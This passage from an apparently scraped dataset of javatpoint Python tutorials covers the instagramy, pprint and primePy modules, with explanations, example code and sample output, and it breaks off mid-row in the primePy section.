Instagram.""]","['https://www.javatpoint.com/python-pprint-module', 'https://www.javatpoint.com/role-of-python-in-artificial-intelligence', 'https://www.javatpoint.com/python-pprint-module', 'https://www.javatpoint.com/role-of-python-in-artificial-intelligence', 'https://www.javatpoint.com/python-pprint-module']",['https://static.javatpoint.com/python/images/python-instagramy-module.png'],[],"['Introduction to Instagramy Module of Python', 'Application of Instagramy Module:', 'Instagramy Module of Python: Installation', 'Implementation of Python Instagramy Module', 'Conclusion']","['Implementation 1: Getting the following number from an Instagram account:', 'Implementation 2: Getting the number of total followers of an Instagram account:', 'Implementation 3: Getting the total number of posts made by an Instagram account:', 'Implementation 4: Printing Bio of an Instagram account:']",[],"['Look at the following example so that we understand the benefits of the instagramy module:', 'Look at the following implementation programs to understand the implementation and working of the instagramy module:', 'Example 1: Look at the following Python program where we have printed the number of followings by given Instagram account:', 'Example 2: Look at the following Python program where we have printed the total number of followers of a given Instagram account:', 'Example 3: Look at the following Python program where we have printed the total number of posts made by the given Instagram account:', 'Example 4: Look at the following Python program where we printed bio description and links given from the input Instagram user name:']","['We have to write the pip command given below in the command prompt shell of our system in order to install the instagramy module through the pip installer:', ""As we can see, a total number of followings by the given Instagram account is printed in the output, and that's how we can get the total followings of any Instagram account."", ""As we can see, the total number of followers of the given Instagram account is printed in the output, and that's how we can get total followers of any Instagram account and save it for future references."", ""Explanation: We have used the same process in this example program as in the first example program, but instead of using 'number_of_followings', we have used the 'number_of_followers' method in this example program."", ""As we can see, a total number of posts made by the given Instagram account is printed in the output, and that's how we can get total posts (which are currently available in the account) made by any Instagram account."", ""As we can see, the description of bio and links present in the bio of the input Instagram account is printed in the output. That's how we can print description and links from the bio of any Instagram user.""]","[""If we talk specifically about Python, it offers us many packages that we can import into a program to do many interesting and cool stuff on Instagram, such as knowing followers & following of a user, reading user's Instagram bio, scrapping like and comment information, etc. One of such Python packages is 'Instagramy', which provides us the functions to perform many of such basic operations on Instagram that we have listed above. Therefore, we are going to learn about this instagramy module of Python in this tutorial and learn how we can use this module to scrap information from Instagram."", ""Instagramy is a Python module that we can use to scrap multiple information from any user's Instagram account. This module provides us with multiple functions that we can use in the Python programs to curate basic information about the account of Instagram's users. The information which we will try to fetch through Instagram will be printed in the output once the program is successfully executed. Instagramy module becomes very important when one wants to know basic details of many Instagram accounts but doesn't have access to the Instagram application or website or doesn't want to visit Instagram."", ""Suppose we are working for a company and we have to hire clients who can promote products of our company through their Instagram account. Since we have to look for the interns who will promote the product through their Instagram account, we will have to look at their Instagram account and check that account if it is strong enough to promote our product to a certain number of people. Otherwise, there will be no benefit for those interns who don't have many followers or following. Now, suppose we have to select 10 final interns from the 1000 applications we have received. In that case, it will become very difficult and time-consuming to go through each applicant's profile to finalize them for selection. In such cases, Python instagramy module becomes very important from where we can directly curate information of as many Instagram users as we want at once. This will not only save lots of effort and time of our but will increase the productivity of the organization also."", 'From this example case study, we can understand how important the instagramy module is and its benefits. Instagramy module provides us flexibility, saves our efforts & time, and increases our productivity. All these are the most common benefits of using the instagramy module of Python.', 'We can use the instagramy module of Python to perform various tasks by using the functions of this module inside a Python program. The result of the tasks will be displayed in the output after fetching the information from the Instagram server. Following are some of the applications which we can perform using the functions of the instagramy module inside a Python program:', ""We have understood the benefits of using the instagramy module of Python, but if really, we want to use this module, we have first to install this module in our system. This is because instagramy is not an in-built module of Python, and that's why to use functions of this module, we have first to perform its installation. Installing and using the instagramy module is very simple, and we can install this module through various methods. But we will install this module through the pip installer in this tutorial because it is the simplest and easiest way of installing this module."", ""Once we have written the command given above in the terminal shell, we just have to press the 'enter' key, and the installation process for the instagramy module will start. As we will see, the installation process started; we have to wait for a while till all the dependencies are installed successfully."", 'As we can see, the instagramy module is now successfully installed in our system, and now we can start working with this module and its functions by importing it into the Python programs. Now, we can work with this module and understand its implementation by using its functions in the example program which we have used in this tutorial.', ""As we have successfully installed the instagramy module in our device, it's time to start working with this module so that we can understand its implementation and functioning in Python programs. We will use some of its functions in example programs of this part to curate some basic information from the given Instagram account and print it in the output. That's how we will understand the implementation and working of the Python Instagramy module."", 'Here, we will get the following number (total number of Instagram accounts followed by a given Instagram account) of an Instagram account and print that number in the output as a result. We will use the function of the instagramy module in the example program to perform this task. Look at the following example program to understand this implementation of the instagramy module:', ""Explanation: First, we have imported the InstagramUser library as IU from the instagramy module in the program to use its function to print the total number of followings. After that, we have taken an Instagram user name (which is valid) as an input from the user, which will be the given Instagram account for the program. Then, we parsed the user name's input value using the InstagramUser function we imported. We did this to create an instance for the given Instagram account in the program. After that, we used the 'number_of_followings' method on the instance we created to get the total number of followings from the account in the initialized variable. Lastly, we used the initialized variable inside the print statement to print the number of followings of the given Instagram account by the user in the output."", 'Here, we will get the followers number (total number of Instagram accounts that follow the given Instagram account) of an Instagram account and print that number in the output as a result. Look at the following example program to understand this implementation of the instagramy module:', 'Here, we will get the total number of posts (which will include short videos, long videos, and pictures posted by the account) of an Instagram account and print that number in the output. We should note that only the total number of those posts which are currently present in the account will be printed in the output. Look at the following example program to understand this implementation of the instagramy module:', 'We can use the functions of the instagramy module to print the bio description and links (if any) given in bio in the output. We will print this information by providing a username as input, and after that, the program will print the information in output after fetching it from the Instagram server. We can look at the following example program to understand bio printing implementation of the instagramy module:', ""Explanation: In the example program given above, we have used the 'biography' method to print the bio description and the 'website' method to print links present in the bio of the Instagram account. This information will be printed in the output once the program is executed successfully and data is fetched from the Instagram server."", 'In this tutorial, we have learned about the Instagramy module of Python and how we can use this module inside a Python program. We have learned how we can install this module in our system and how we can use the functions of this module to print some basic information from a given Instagram user name. We have used the instagramy module to work with its functions in the example programs to understand the working and implementation of this module.']","['pip install instagramy', '# Importing InstagramUser from instagramy module', 'from instagramy import InstagramUser as IU', '# Taking the Instagram account or User Name as input', 'givenUN = input(""Enter a valid and existing Instagram\'s user name: "")', '# Creating instance for giver User name', 'unInstance = IU(givenUN)', '# Getting total number of followings', 'followingNumber = unInstance.number_of_followings', '# Printing result in the output', ""print('The total number of followings from the given user name by you is:', followingNumber)"", '# Importing InstagramUser from instagramy module', 'from instagramy import InstagramUser as IU', '# Taking the Instagram account or User Name as input', 'givenUN = input(""Enter a valid and existing Instagram\'s user name: "")', '# Creating instance for giver User name', 'unInstance = IU(givenUN)', '# Getting total number of followers of Instagram account', 'followersNumber = unInstance.number_of_followers', '# Printing result in the output', ""print('The total number of followers of the given Instagram user name by you is:', followersNumber)"", '# Importing InstagramUser from instagramy module', 'from instagramy import InstagramUser as IU', '# Taking the Instagram account or User Name as input', 'givenUN = input(""Enter a valid and existing Instagram\'s user name: "")', '# Creating instance for giver User name', 'unInstance = IU(givenUN)', '# Getting total number of posts made', 'postsNumber = unInstance.number_of_posts', '# Printing result in the output', ""print('The total number of posts made by the given Instagram user name by you is:', postsNumber)"", '# Importing InstagramUser from instagramy module', 'from instagramy import InstagramUser as IU', '# Taking the Instagram account or User Name as input', 'givenUN = input(""Enter a valid and existing Instagram\'s user name: "")', '# Creating instance for giver User name', 'unInstance = IU(givenUN)', ""# Getting description of the account's bio"", 'instaBioDesc = unInstance.biography', ""# Gettings links present in the account's bio"", 'instaBioLinks = unInstance.website', '# Printing result in the output', 'print(""Description of the bio of the Instagram account that you have provided in the input: "")', 'print(instaBioDesc)', 'print(""Following links are present in the bio of Instagram account which you have provided: "")', 'print(instaBioLinks)']","[""Enter a valid and existing Instagram's user name: ayushmannk"", 'The total number of followings from the given user name by you is: 866', ""Enter a valid and existing Instagram's user name: virat.kohli"", 'The total number of followers of the given Instagram user name by you is: 174673618', ""Enter a valid and existing Instagram's user name: adityaroykapur"", 'The total number of posts made by the given Instagram user name by you is: 85', ""Enter a valid and existing Instagram's user name: jaiswalsonoo"", 'Description of the bio of the Instagram account that you have provided in the input:', 'Founder and CEO of Javatpoint', 'Following links are present in the bio of Instagram account which you have provided:', 'http://www.javatpoint.com/']",[],"['|||Getting numbers of followers of an Instagram account|||Getting Bio details of an Instagram account|||Getting the number of Total posts made by an account|||Getting numbers of followings of an Instagram account, etc.|||']"
428,['Python pprint Module'],"[""While printing data from a program, we have faced the issue of printing datasets in a standard format. The data printed in the output is printed without a defined format, which makes data look unorganized. Also, it makes it difficult for us to look for particular information from the printed dataset. If we have to print this data in some set format, we have to use multiple format functions with every row & column of the dataset. This becomes time-consuming and hectic when the given dataset has multiple numbers of rows and columns with different size entries. Therefore, if we have to print the dataset in some sorted way in the output from a program, we have to look for some alternate choices of printing the dataset in a set format. This set format printed dataset will also help when we look for some particular information from the dataset. That's why the importance of such pretty printer packages increases during the development and programming tasks. Many programming languages provide us with packages that we can use to print datasets in a set format in the output. Talking specifically about Python, it has a pprint module that comes with multiple functions used to print datasets in some set or defined format. Therefore, we will study this pprint module of Python in this tutorial and learn how we can use the functions of this module to print datasets in some specific format in the output.""]","['https://www.javatpoint.com/python-primepy-module', 'https://www.javatpoint.com/python-instagramy-module', 'https://www.javatpoint.com/python-primepy-module', 'https://www.javatpoint.com/python-instagramy-module', 'https://www.javatpoint.com/python-primepy-module']",[],[],"['Introduction to pprint Module of Python', 'pprint Module in Python: Installation', 'Classes in the pprint Module', 'Methods in the PrettyPrinter Class:', 'pprint Module in Python: Implementation', 'Providing Width Parameter:']","['Syntax for Defining PrettyPrinter Class Constructor:', 'Implementation 1: Using pprint() Function for Formatted Output:', 'Recursive Data Structure Printing with pprint() Function:', 'Implementation 2: Using pformat() Function for Formatted Output:']",[],"['Thus, we can use this module in the example programs in this tutorial to work with it and understand its implementation.', 'We have to use the following syntax or line of code for defining the constructor of the pprint class:', 'Look at the following example programs to understand the implementation of functions of the pprint module for printing data structures:', 'Example 1: Look at the following Python program where we have compared the simple print statement output with the pprint() function output:', 'Example 2: Look at the following program where we have printed a recursive object in the output:', ""Example 3: Look at the following program where we used the width parameter for PrettyPrinter class's constructor:"", '(i) pformat as a method', '(ii) pformat as a function', 'We will use an example program in each case to understand the implementation of pformat.', '(i) Using pformat as a Method:', '(ii) Using pformat as a Function:', 'We can look at the following example program to understand the function implementation of pformat:']","['(iii) depthInData: The depth parameter of the function is used to control the number of levels printed in the output. It is an optional argument of the function, and no default value is present for this parameter.', '(iv) stream: The default value of the stream parameter is std.out- the default output machine. This parameter is used in the function to take any stream object such as files while printing data structures in the output.', '(v) compact: It is the last argument used in the PrettyPrinter() function, and by default, compact parameter id is set to False. We have to set this argument to True only when the data we are displaying is adjustable within width.', 'These are the five arguments that should be given in the PrettyPrinter() function while defining the constructor for the PrettyPrinter class. We can use these arguments to specify the format we want to print the given data structure in the output.', 'b) pformat() function: Based on the parameters we provided in the constructor of the PrettyPrinter class, this function returns the formatted representation of the PrettyPrinter object.', ""These two functions are defined under the PrettyPrinter class's constructor, and we can use these methods with the constructor and print data structure in the output."", ""As we can see, the formatted output of the student's data structure is printed according to the width we have provided inside the PrettyPrinter class using width argument, i.e., width = 24."", 'We will learn to implement the pformat() function for printing formatted output of given data structure in this implementation part. We can implement the pformat function from the PrettyPrinter constructor using the following two ways:', 'Here, we will use pformat like a method to print the formatted output with this function. We can look at the following example program to understand the method implementation of pformat:']","[""pprint module is part of Python's standard library that comes with multiple functions used to print a given dataset in the specific format in the output. The name of the pprint module itself stands for pretty-printer module, and it is also known as Data pretty printer module. The aesthetically good-looking appearance of data structures and datasets is also possible because of the functionality of the pprint module. pprint module enables us to print any given data structure in a defined format and thus gives it an aesthetically good-looking appearance in the output. Any data structure or dataset, which is correctly parsed and executed in the Python program, is elegantly formatted in the output by the functionality of the pprint module."", ""As far as possible, the formatted expression of the data structures in the output is kept in a single line by the pprint module, but sometimes when the length of format expression exceeds the defined length, it is broken into multiple lines. Sometimes, the formatted expression breaks into multiple lines when its size exceeds the default width parameter of the pprint module's formatting functions. The dictionary data in the pprint output of the program is automatically formatted before representing or displaying the result in the output, and it is the one unique feature of the pprint module. Thus, we can say that data printed using the pprint module is well-structured and in a more readable form."", ""pprint module comes with the standard libraries of Python, i.e., pprint is a pre-installed module of Python installed along with the installation of standard Python distribution. Therefore, we don't have to perform or carry out any installation process before using the pprint module in the Python programs. We can directly start importing this module into Python programs to work with it and understand its implementation and functioning. We can use the following line of code for importing the pprint module of Python in the programs:"", 'The pprint module of Python contains the definition of the PrettyPrinter class in its standard library to set the given data structure in a sorted format. To use the PrettyPrinter class of this module, we have to define a constructor for the class in the program, and only after that can we use functions of the pprint module from this PrettyPrinter class.', 'If we have to use the pprint class in the program, we can use it by defining the constructor of this class in the program and then use the constructor with the functions of the pprint module while printing data structures or datasets in some specific format.', 'Arguments: As we can see in the syntax written above, the constructor of the pprint class can be defined using the PrettyPrinter() function of the pprint module. The PrettyPrinter() function takes the following five arguments while we are using it to define the constructor for the PrettyPrinter class:', ""(i) indentGiven: The indent parameter of the function is used to define the indentation that should be added after each recursive level (Data values in each row and column). If we don't define this parameter by passing an argument in the function, the function will take the default argument, which is 1 for the indent argument."", ""(ii) widthOfLine: This parameter of the function defines the width of every line from the data structure, and desired output format of the data structure is restricted to this format. The default value for the width parameter is 80, and it is used when we don't provide any width argument in the function. If the length of the line of data structure is more than the width parameter defined in the function, it will break into multiple line structures in the output."", ""The pprint module has multiple methods in which some of them are defined using the constructor of the PrettyPrinter class. These methods or functions defined by the PrettyPrinter class's constructor are used in the program to print the data structure in the specified format. Following are the two methods that are defined under the constructor of the PrettyPrinter class:"", 'a) pprint() function: The first method in the PrettyPrinter class is the pprint() function, which prints the formatted representation of the PrettyPrinter object (where data from data structure is stored in a specific format) in the output. We can use this function as the print statement to print any data from the program.', 'We have learned about functions, classes, and methods of the pprint module till now in this tutorial. Now, we will understand the working of the pprint module and its classes & functions in this part of the tutorial. We will use the functions and class constructors of the pprint module in the example programs to understand their functioning and working in the program. We will use the pprint() and pformat() functions in the example programs to understand their implementation and work that how we can pformat (use these functions to print data structures according to the specified format in the output.', 'In this implementation part, we will use the pprint() function of the pprint module to print the data structures given in the program in a specified format so that it will look catchier and formatted. We will use some example programs to understand the working of this pprint() functions with different arguments given in the function. First, look at the following example program to understand the output printed using the pprint() function:', ""As we can see, normal print output and pprint function's formatted output of the student data structure are printed in the output. We can observe the difference between the normal output and the pprint() function's formatted output and conclude that the pprint() function's formatted output is much simple and easily observable. That's how we can use the pprint() function without any argument inside it to print the formatted output of the given data structure."", ""Explanation: We have first imported the pprint module in the program as ppr, and after that, we defined the constructor of the PrettyPrinter class. We have also defined a sample data structure of some students' data and named this data structure as studentDS. We named the PrettyPrinter class's constructor variable as ppConst and used it later with the pprint() function. We have then used the pprint() function with the ppConst constructor variable. While using the pprint() function, we passed the student's data structure variable as an argument to format the output of the student data structure. After that, first, we have printed the normal output of the data structure using the studentDS variable. And, lastly, we printed the pprint() function's formatted output using the pprint() function to compare it with the normal output."", 'We can also print data structure recursively with the pprint() function. Here, we will also try to print a recursive object from the given data structure, and for the further recursion process, only the references will be printed in the output. Look at the following example program to understand the recursive object printing implementation of the pprint() function:', 'As we can see, when we printed the appended list in the output using the pprint() function, the last item from the list was printed as a recursive object. The output shows that recursion is started on the list with the object reference id of the last item.', 'Now, we will provide the width parameter (which we discussed in the previous section) of the PrettyPrinter class while defining the constructor for the same. The width we provide inside the PrettyPrinter() function formats the output according to the given width and presents it in the same format. Look at the following example program to understand the width parameter implementation of the PrettyPrinter class:']","['# Importing the pprint module', 'import pprint', '# Constructor for pprint class', 'pcr = ppr.PrettyPrinter(indentGiven, widthOfLine, depthInData, stream, compact)', '# Importing the pprint module as ppr', 'import pprint as ppr', '# Defining a data structure that has students data', 'studentDS = {""Dwayne Johnson"": [""English"", ""Chemistry"", ""Physics"", ""Mathematics"", ""Biology""],', '""Randy Orton"" :{""English"": 50,""Physics"": 60,', '""Chemistry"": 70, ""Mathematics"": 80, ""Biology"": 90},', '""Karl Marx"" :(50, 60, 70, 80, 90)}', '# Defining Constructor for the PrettyPrinter class', 'ppConst = ppr.PrettyPrinter()', '# Printing normal output of the student data structure', 'print (""Normal output of student data structure with print statement:"")', 'print (studentDS)', 'print (""----"")', '# Printing formatted output of the pprint() function', 'print (""The pprint function\'s formatted output of the student data structure:"")', '# Using pprint() function', 'ppConst.pprint(studentDS)', '# Importing the pprint module as ppr', 'import pprint as ppr', '# Define a list of numbers', 'numList = list(range(24, 31))', '# Appending the list', 'numList.append(numList)', '# Printing appended number list', 'print(""Appended list of numbers: "")', 'print(numList)', 'print(""----------------"")', '#Printing recursive object with pprint() function', 'print(""Appended list with recursive object from pprint function: "")', 'ppr.pprint(numList)', '# Importing the pprint module as ppr', 'import pprint as ppr', ""# Defining a data structure which having student's data"", 'studentDS = {""Dwayne Johnson"": [""English"", ""Chemistry"", ""Physics"", ""Mathematics"", ""Biology""],', '""Randy Orton"" :{""English"": 50,""Physics"": 60,', '""Chemistry"": 70, ""Mathematics"": 80, ""Biology"": 90},', '""Karl Marx"" :(50, 60, 70, 80, 90)}', '# Defining Constructor for the PrettyPrinter class with width argument', 'ppConst = ppr.PrettyPrinter(width = 24)', '# Printing formatted output of the pprint() function', 'print (""The pprint function\'s formatted output of the student data structure with defined width:"")', 'ppConst.pprint(studentDS)', '# Importing the pprint module as ppr', 'import pprint as ppr', ""# Defining a data structure which having student's data"", 'studentDS = {""Dwayne Johnson"": [""English"", ""Chemistry"", ""Physics"", ""Mathematics"", ""Biology""],', '""Randy Orton"" :{""English"": 50,""Physics"": 60,', '""Chemistry"": 70, ""Mathematics"": 80, ""Biology"": 90},', '""Karl Marx"" :(50, 60, 70, 80, 90)}', '# Defining Constructor for the PrettyPrinter class', 'ppConst = ppr.PrettyPrinter()', '# Using pformat() function', 'pfOutput = ppConst.pformat(studentDS)', '# Printing formatted output of the pprint() function', 'print (""The pformat method\'s formatted output of the student data structure:"")', 'print(pfOutput)', '# Importing the pprint module as ppr', 'import pprint as ppr', ""# Defining a data structure which having student's data"", 'studentDS = {""Dwayne Johnson"": [""English"", ""Chemistry"", ""Physics"", ""Mathematics"", ""Biology""],', '""Randy Orton"" :{""English"": 50,""Physics"": 60,', '""Chemistry"": 70, ""Mathematics"": 80, ""Biology"": 90},', '""Karl Marx"" :(50, 60, 70, 80, 90)}', '# Using pformat() function', 'pfOutput = ppr.pformat(studentDS)', '# Printing formatted output of the pprint() function', 'print (""The pformat function\'s formatted output of the student data structure:"")', 'print(pfOutput)']","['Normal output of student data structure with print statement:', ""{'Dwayne Johnson': ['English', 'Chemistry', 'Physics', 'Mathematics', 'Biology'], 'Randy Orton': {'English': 50, 'Physics': 60, 'Chemistry': 70, 'Mathematics': 80, 'Biology': 90}, 'Karl Marx': (50, 60, 70, 80, 90)}"", '----', ""The pprint function's formatted output of the student data structure:"", ""{'Dwayne Johnson': ['English',"", ""'Chemistry',"", ""'Physics',"", ""'Mathematics',"", ""'Biology'],"", ""'Karl Marx': (50, 60, 70, 80, 90),"", ""'Randy Orton': {'Biology': 90,"", ""'Chemistry': 70,"", ""'English': 50,"", ""'Mathematics': 80,"", ""'Physics': 60}}"", 'Appended list of numbers:', '[24, 25, 26, 27, 28, 29, 30, [...]]', '----------------', 'Appended list with recursive object from pprint function:', '[24, 25, 26, 27, 28, 29, 30, ]', ""The pprint function's formatted output of the student data structure with defined width:"", ""{'Dwayne Johnson': ['English',"", ""'Chemistry',"", ""'Physics',"", ""'Mathematics',"", ""'Biology'],"", ""'Karl Marx': (50,"", '60,', '70,', '80,', '90),', ""'Randy Orton': {'Biology': 90,"", ""'Chemistry': 70,"", ""'English': 50,"", ""'Mathematics': 80,"", ""'Physics': 60}}"", ""The pformat method's formatted output of the student data structure:"", ""{'Dwayne Johnson': ['English',"", ""'Chemistry',"", ""'Physics',"", ""'Mathematics',"", ""'Biology'],"", ""'Karl Marx': (50, 60, 70, 80, 90),"", ""'Randy Orton': {'Biology': 90,"", ""'Chemistry': 70,"", ""'English': 50,"", ""'Mathematics': 80,"", ""'Physics': 60}}"", ""The pformat function's formatted output of the student data structure:"", ""{'Dwayne Johnson': ['English',"", ""'Chemistry',"", ""'Physics',"", ""'Mathematics',"", ""'Biology'],"", ""'Karl Marx': (50, 60, 70, 80, 90),"", ""'Randy Orton': {'Biology': 90,"", ""'Chemistry': 70,"", ""'English': 50,"", ""'Mathematics': 80,"", ""'Physics': 60}}""]",[],[]
429,['Python PrimePy Module'],"[""We all have learned about prime numbers in our school days, and don't worry if any of us have forgotten about them. Prime numbers are basically those natural numbers that are only divisible by 1 or themselves, and the other definition of a prime number is that natural numbers that are greater than 1 and don't have any complete divisible factors other than the number itself or 1. All the prime numbers are odd except for the '2', which is the only even prime number.""]","['https://www.javatpoint.com/android-development-using-python', 'https://www.javatpoint.com/python-pprint-module', 'https://www.javatpoint.com/android-development-using-python', 'https://www.javatpoint.com/python-pprint-module', 'https://www.javatpoint.com/android-development-using-python']",['https://static.javatpoint.com/python/images/python-primepy-module.png'],[],"['Introduction to PrimePy Module of Python', 'Installation of PrimePy Module', 'Implementation of PrimePy Module of Python']","['Implementation 1: Functions to Check If a given Natural Number is Prime:', 'Implementation 2: Printing all the Prime Factors of a given Natural Number in the Program:', 'Implementation 3: Printing Lowest or First Prime Factor of a Number:', 'Implementation 4: Prime Numbers up to a given Natural Number:', ""Implementation 5: Printing First 'n' Prime Numbers:"", 'Implementation 6: Getting all Prime Numbers that are present between any two given Input Numbers:']",[],"['All the prime numbers, except 2 and 3, can be expressed using any one of the two forms given below:', '(i) 6a + 1', '(ii) 6a - 1', ""In the above-given expressions, 'a' is a natural number."", 'We can perform the following several functions using the functions of the primepy module:', '1) Checking Prime Number', ""2) Return 'n' numbers of prime number"", ""3) Return first 'n' prime numbers"", '4) Prime numbers between two numbers and many others', 'Where num = a given natural number in the program', 'We can understand the implementation of the check() function of the primepy module by using this function in the following example program:', 'Example 1: Look at the following Python program where we find out if the given number is prime:', 'Where num = a given natural number in the program', 'Example 2: Look at the following program where we found out and printed all prime factors of the given user input numbers as a result:', 'Where num = a given natural number in the program', 'Where num = a given natural number in the program', 'Where num = a given natural number in the program']","['As we can see, the primepy module is successfully installed in our device, and now we can import this module in the Python programs to use the functions of this module to work with prime numbers.', ""We will perform these tasks using the functions of the primepy module inside the example programs of this section, and that's how we will understand the implementation of the primepy module."", 'We can understand the implementation of factors() function of the primepy module to print all prime factors of a natural input number by using this function in the following example program:', ""As we can see, all prime factors of both the numbers entered by the user in the input are printed in the output, and that's how we can know all the prime factors of any given number."", 'We can understand the implementation of the factor() function of the primepy module to print the first prime factor of a number by using this function in the following example program:', 'Example 3: Look at the following program where we have used the factor() function to print the lowest or first prime factor of the given input numbers:', 'We can understand the implementation of the upto() function of the primepy module for printing prime numbers up to a given number by the user by using this function in the following example program:', 'Example 4: Look at the following program where we have used the upto() function to print all the prime numbers up to the given numbers by the user in input():', ""As we can see, all the prime numbers which are less than or equal to the input numbers given by the user are printed in the output. That's how we can use the upto function to print all prime numbers upto a given natural number."", ""We can understand the implementation of the first() function of the primepy module to print the first 'n' prime factors by using this function in the following example program:"", ""Example 5: Look at the following program where we have used the first() function to print the first 'n' prime factors of the given input number by the user:"", ""As we can see, first 'num' (user input numbers in the program) prime numbers are printed in the output, and that's how we can print any first 'num' prime numbers.""]","['We all may have heard that it is very easy to deal with the numbers through programming languages, and this is because most of the programming languages provide us the packages which we can use to classify and work with numbers of all types, such as integers, natural, and other types. Using these programming languages packages inside a program makes it very easy to deal with numbers, classify the numbers, and work with numbers. Like all other programming languages, Python also provides us multiple packages which we can use inside the Python programs to deal and work with numbers. Some of these packages come in-built the source Python, and some of them require to be installed when we have to work with them. PrimePy, the module of Python, is one of such Python packages about whom we have talked above. Using the primepy module in a Python program, we can work and perform many operations on prime numbers like finding prime factors of a number, etc. Therefore, we will learn about the primepy module in this tutorial and understand how we can use it and its functions in a Python program to work on prime as well as other numbers.', ""PrimePy is a Python package or module which provides multiple functions that we can use to compute multiple operations related directly or indirectly to prime numbers. The biggest advantage of this module is that using this module, all the functions on prime numbers can be performed in less time. Since Prime numbers don't have any factors and that's why sometimes it becomes much difficult to work with them. In such instances, the primepy module becomes very important as it provides functions that we can use to carry out all these operations on prime numbers easily."", ""As we have already stated in the introduction part, some Python modules don't come in-built inside with the Python source package. The primepy is one of such packages which doesn't come in-built, and therefore if we want to work with this module of Python, we have first to install this module in our device. There are multiple installation methods available which we can use to install the primepy module in our machine, but before we choose any of these methods, we should try to find out which one is the easiest and simplest for us. Therefore, we have installed the primepy module in our system by using the pip installer installation method in this part of the tutorial. Using the pip installer method to install the primepy module is the simplest and easiest method, and we just have to write the following pip command inside the terminal shell to install this module:"", ""Once we write the above-given pip command inside the command prompt terminal of our system, we just have to press 'enter,' and installation of the primepy module will begin. Now, we have to only wait for some time until all dependencies for this module are successfully installed."", 'We can use the primepy module in Python programs to perform many functions that include direct or indirect involvement of prime numbers. After importing the primepy module into a program, we can use the functions of this module to perform the required tasks on prime numbers.', 'We can use the primepy module to determine if the given number is prime or not. PrimePy module provides us with the check() function, which we can use to check the number is prime or not. Following is the syntax for using the check() function in a Python program:', ""As we can see, the output is printed in the form of true and false, stating whether the numbers entered by the user are prime or not. That's how we can write any Python program using the check() function of the primepy module to check that if the given number in the program is prime or not."", 'Using the functions of the primepy module, we can easily print all the prime factors in the output of any given natural number in the program. The PrimePy module provides us with the factors() function that we can use in any example program to print all prime factors of the given user input number or number given in the program. Following is the syntax for using factors() function in a Python program:', 'This implementation of the primepy module works very similarly to the previous implementation of this module. The only difference in both these implementations is that we will only print the first or lowest prime factor of a number, whereas previously, we were printing all prime factors of the given number. The primepy module provides us with the factor(), which we can use to print the lowest prime factor of any given number. Following is the syntax for using the factor() function in a Python program:', ""As we can see, the lowest or first prime factor of both the input numbers is printed in the output, and that's how we can use the factor() function of the primepy module in any Python program to print the lowest prime factor of any given natural number."", ""Suppose we have a number given, and we have to find out how many prime numbers exist which are less than or equal to the given number. It is a very hectic and time-consuming task if calculated manually, and that's where we can take advantage of the primepy module. The primepy module provides us the option where we can print all the prime numbers up to a given number by the user. For this task, the primepy module provides us with the upto() function, which we can use with any natural number to print prime numbers upto the given number. Following is the syntax for using the factor() function in a Python program:"", ""This implementation of the primepy module is similar to the previous implementation of this module because, in both implementations, we are printing certain prime numbers according to the given number. Talking particularly about this implementation part, we will print first 'n' (where n is a natural number) prime numbers, and 'n' will be the given number in the program. The primepy module provides us with the first() function, which we can use to print first 'n' prime numbers in the output. Following is the syntax for using the first() function in a Python program:"", ""This implementation part of the primepy module is also very similar to the implementation of this module's upto() function. The only difference is that here, we will find prime numbers between any two given numbers, whereas previously, we were finding prime numbers upto a given number (or prime numbers between 1 and the given number). For performing the task to find out all prime numbers present between any two user input natural numbers, the primepy module provides us with the between() function. Following is the syntax for using this between() function for finding all prime numbers between two given numbers:"", ""As we can see, all the prime numbers that are present between the two given natural numbers by the user are printed in the output, and that's how we can use the between() function of the primepy module to find out and print all prime numbers between any two given numbers.""]","['pip install primePy', '>> prime.check(num)', '# Importing prime library from the Primepy module', 'from primePy import primes as pms', '# Taking two natural numbers as user input', 'num1 = int(input(""Enter first natural number: ""))', 'num2 = int(input(""Enter second natural number: ""))', '# Checking If user input numbers are prime', 'res1 = pms.check(num1)', 'res2 = pms.check(num2)', '# Printing result in the output', 'print(""Is the first natural number which is entered by user in input is prime? "", res1)', 'print(""Is the second number entered by user is prime? "", res2)', '>> prime.factors(num)', '# Importing prime library from the Primepy module', 'from primePy import primes as pms', '# Taking two natural numbers as user input', 'num1 = int(input(""Enter first natural number: ""))', 'num2 = int(input(""Enter second natural number: ""))', '# Finding all prime factors of user input numbers', 'res1 = pms.factors(num1)', 'res2 = pms.factors(num2)', '# Printing result of prime factors in the output', 'print(""All prime factors of the first number entered by user: "", res1)', 'print(""All prime factors of the second number entered by user: "", res2)', '>> prime.factor(num)', '# Importing prime library from the Primepy module', 'from primePy import primes as pms', '# Taking two natural numbers as user input', 'num1 = int(input(""Enter first natural number: ""))', 'num2 = int(input(""Enter second natural number: ""))', '# Finding lowest prime factor from the user input numbers', 'res1 = pms.factor(num1)', 'res2 = pms.factor(num2)', '# Printing result of the lowest prime factor in the output', 'print(""The lowest prime factor of the first number entered by user: "", res1)', 'print(""The first prime factor of the second number entered by user: "", res2)', '>> prime.upto(num)', '# Importing prime library from the Primepy module', 'from primePy import primes as pms', '# Taking two natural numbers as user input', 'num1 = int(input(""Enter first natural number: ""))', 'num2 = int(input(""Enter second natural number: ""))', '# Finding total prime number upto user input numbers', 'res1 = pms.upto(num1)', 'res2 = pms.upto(num2)', '# Printing result of prime factors in the output', 'print(""Following are all prime numbers that are either less than or equal to"", num1, ""as given by the user: "", res1)', 'print(""Following are all prime numbers that are either less than or equal to"", num2, ""as given by the user: "", res2)', '>> prime.first(num)', '# Importing prime library from the Primepy module', 'from primePy import primes as pms', '# Taking a natural number as user input', 'num1 = int(input(""The number of first prime numbers you want to print: ""))', '# Finding total first prime numbers according to user input number', 'res1 = pms.first(num1)', '# Printing result of all first prime numbers in the output', 'print(""These are first"", num1, ""prime numbers as the number entered by user: "", res1)', '>> primes.between(num1, num2)', '# Importing prime library from the Primepy module', 'from primePy import primes as pms', '# Taking three natural numbers as user input', 'num1 = int(input(""Enter first natural number: ""))', 'num2 = int(input(""Enter second natural number: ""))', 'num3 = int(input(""Enter third natural number: ""))', '# Getting all prime numbers which are between the two input numbers', 'res1 = pms.between(num1, num2)', 'res2 = pms.between(num2, num3)', '# Printing resultant prime numbers in the output', 'print(""These are all prime numbers which are present between first and second number given by you: "", res1)', 'print(""These are the prime numbers which are present between the second and third number given by you: "", res2)']","['Enter first natural number: 88', 'Enter second natural number: 673', 'Is the first natural number which is entered by the user in the input is prime?  False', 'Is the second number entered by user is prime?  True', 'Enter first natural number: 243', 'Enter second natural number: 679', 'All prime factors of the first number entered by user:  [3, 3, 3, 3, 3]', 'All prime 